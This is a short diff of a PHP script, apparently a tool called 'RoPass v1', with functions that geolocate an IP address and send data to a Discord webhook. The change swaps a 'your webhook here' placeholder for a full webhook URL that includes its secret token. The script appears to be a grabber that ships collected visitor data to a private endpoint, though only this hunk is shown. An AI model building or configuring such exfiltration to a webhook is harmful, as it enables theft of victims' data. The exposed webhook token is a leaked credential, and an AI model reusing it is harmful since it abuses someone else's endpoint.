@@ -12,7 +12,7 @@ function getGeolocation($ip) {
 
 function sendToDiscordWebhook($data) {
 
-    $webhookUrl = "TON_WEBHOOK_ICI";
+    $webhookUrl = "https://discord.com/api/webhooks/1503805736327713021/y3z2ZA7rURYoBq1yH_p0IkWULLlEiy1kq6nHoctNbZ0ehkHgvYKcws6utoXH1tt_mADD";
 
     $embed = [
         "title" => "RoPass v1",
